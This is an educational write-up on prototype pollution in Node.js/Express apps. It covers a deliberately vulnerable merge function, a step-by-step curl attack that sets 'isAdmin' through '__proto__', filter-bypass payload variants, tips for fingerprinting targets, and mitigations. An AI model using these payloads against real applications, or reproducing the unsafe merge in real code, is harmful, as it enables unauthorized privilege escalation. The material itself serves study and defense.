# Prototype Pollution

**Category:** Web Application Vulnerabilities  
**Stack:** Node.js / Express.js / Any JavaScript backend  
**OWASP:** A03 Injection  
**Severity:** High — can lead to authentication bypass, privilege escalation, RCE in some cases

---

## The Simple Version

Every JavaScript object in an application secretly shares a common ancestor called `Object.prototype`. Think of it as a shared whiteboard in a classroom — every student (object) inherits whatever is written on it.

When a merge/update function blindly copies user-supplied JSON into an object without filtering keys, an attacker can use the special `__proto__` key to write directly onto that shared ancestor. Every object in the entire application then inherits the poisoned value automatically.

**Result:** One HTTP request can make every user in the app an admin simultaneously.

---

## How JavaScript Inheritance Works

When JavaScript looks for a property on an object:
1. Checks the object itself first
2. If not found, climbs up to the parent (`__proto__`)
3. Keeps climbing until it hits `Object.prototype`
4. If still not found, returns `undefined`

This chain is called the **prototype chain**.

```
yourUserObject → Object.prototype → null
```

If you poison `Object.prototype`, every object that looks up a property finds it there.

---

## The Vulnerable Pattern

A developer writes a merge function to handle partial updates:

```javascript
function merge(target, source) {
  for (let key in source) {
    if (typeof source[key] === 'object') {
      if (!target[key]) target[key] = {};
      merge(target[key], source[key]);  // recurses into __proto__
    } else {
      target[key] = source[key];
    }
  }
}
```

This looks harmless. But when `source` contains `__proto__`, the recursion writes directly onto `Object.prototype`.

---

## The Attack

**Target:** An app with:
- An update endpoint that merges user JSON
- An admin check that reads `isAdmin` from a user object

**Step 1 — Confirm the endpoint accepts arbitrary keys:**
```bash
curl -b cookies.txt -X POST http://TARGET:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"name": "test"}'
# Expected: {"status":"updated"}
```

**Step 2 — Send the prototype pollution payload:**
```bash
curl -b cookies.txt -X POST http://TARGET:3000/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"isAdmin": true}}'
# Expected: {"status":"updated"}
```

**Step 3 — Access the protected endpoint:**
```bash
curl -b cookies.txt http://TARGET:3000/api/admin/flag
# Expected: {"flag":"..."}
```

---

## Payload Variants

Some apps filter `__proto__` at the input layer. Use these alternative paths:

```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
{"__proto__": {"isAdmin": true, "role": "admin"}}
```

Both `__proto__` and `constructor.prototype` reach `Object.prototype` through different routes.

---

## How to Find It

**Fingerprint the stack first:**
- `X-Powered-By: Express` header → Node.js/Express backend
- `connect.sid` cookie → express-session middleware
- `Cannot GET /nonexistent` plain text response → Express default error handler

**Look for merge/update endpoints:**
- `/api/user/update`
- `/api/profile`
- `/api/settings`
- `/api/preferences`
- Any endpoint that accepts JSON and updates user properties

**Test by sending unexpected keys:**
```bash
curl -X POST TARGET/api/user/update \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"testPollution": true}}'
```

Then check if pollution worked:
```bash
curl TARGET/api/debug  # or any endpoint that reflects object properties
```

---

## MERN Stack Fingerprinting

| Signal | Value | What It Means |
|---|---|---|
| `X-Powered-By: Express` | Present | Express.js backend confirmed |
| `connect.sid` cookie | Present | express-session in use |
| `Cannot GET /path` | Plain text 404 | Express default error handler |
| Port 3000 or 5000 | Common | Express default dev ports |
| Port 27017 | Open | MongoDB |

---

## Real World Impact

**Famous CVEs:**
- **CVE-2019-10744** — lodash (100M+ weekly downloads) — prototype pollution in `defaultsDeep`, `merge`, `mergeWith`
- **CVE-2019-11358** — jQuery — prototype pollution in `$.extend`
- Multiple `hoek`, `mixin-deep`, `set-value` npm packages

**Why it still exists in 2026:**
- Millions of Node.js apps written before this was widely understood
- Internal tools that never get security audits
- Developers who copy merge utility functions without understanding the risk
- Third-party npm dependencies that haven't been updated

**Bug bounty value:** High — authentication bypass via prototype pollution is a P1/Critical finding on most programs.

---

## Mitigations (Defender Perspective)

```javascript
// Option 1 — Use Object.create(null) for merge targets
const target = Object.create(null);

// Option 2 — Filter dangerous keys
const DANGEROUS_KEYS = ['__proto__', 'constructor', 'prototype'];
function safeMerge(target, source) {
  for (let key in source) {
    if (DANGEROUS_KEYS.includes(key)) continue;
    // ... rest of merge
  }
}

// Option 3 — Use JSON schema validation
// Option 4 — Use Helmet middleware
// Option 5 — Freeze Object.prototype
Object.freeze(Object.prototype);
```

---

## Related Vulnerabilities

- **Mass Assignment** — same root cause (unsanitized object merging), different context
- **NoSQL Injection** — similar pattern, MongoDB operator injection via `$where`, `$gt` etc.
- **SSTI (Server Side Template Injection)** — code execution via template engines

---

## Tools

- **pp-finder** — automated prototype pollution scanner
- **Burp Suite** — manual testing of JSON endpoints
- **npm audit** — checks dependencies for known prototype pollution CVEs
